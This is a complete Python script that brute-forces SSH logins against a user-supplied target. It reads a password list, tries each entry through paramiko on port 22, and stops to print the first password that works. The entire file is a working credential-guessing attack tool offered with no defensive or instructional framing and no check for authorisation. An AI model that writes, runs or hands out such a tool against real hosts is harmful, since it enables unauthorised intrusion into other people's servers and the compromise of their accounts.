import paramiko, sys, os, socket, termcolor

print('-------------------------------------------------')
host = input('[+] Target Address: ')
username = input('[+] SSH Username: ')
input_file = input('[+] Password File/Path: ')
print('-------------------------------------------------')

if not os.path.exists(input_file):
    print('[!!] File/Path does not exists.')
    sys.exit(1)

def ssh_connect(password,code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(host,port=22,username=username,password=password)
    except paramiko.AuthenticationException:
        code=1
    except socket.error as e:
        code = 2
    
    ssh.close()
    return code




with open(input_file,'r') as file:
    for line in file.readlines():
        passwd = line.strip()
        try:
            response = ssh_connect(passwd)
            if response==0:
                print(termcolor.colored(('[+] Found Password '+ passwd + ' For Username ' + username),'green'))
                break 
            elif response==1: print('[-] Incorrect Login: '+ passwd)
            elif response==2:
                print('[!!] Can not connet to the target.') 
                sys.exit(1)
        except Exception as e:
            print(e)
            pass




